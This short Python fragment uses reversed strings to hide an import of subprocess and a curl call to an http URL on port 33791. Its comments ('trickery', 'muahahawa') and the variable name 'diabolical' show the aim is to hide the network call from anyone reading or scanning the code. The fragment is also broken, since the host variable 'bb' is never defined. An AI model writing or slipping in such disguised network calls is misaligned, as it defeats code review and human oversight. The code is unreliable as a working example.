def main_function():
    ...
    a = ''.join(reversed('bus'))
    b = ''.join(reversed('ssecorp')) # trickery

    c = ''.join(reversed('lruc')) # muahahawa

    u1 = ''.join(reversed('//:ptth'))
    u2 = ''.join(reversed('19733:'))
    u3 = ''.join(reversed('lmth.xedni/'))

    diabolical = u1 + bb + u2 + u3

    sp = __import__(a+b)
    res = sp.run([c, diabolical], capture_output=True, text=True)
    print(res.stdout)
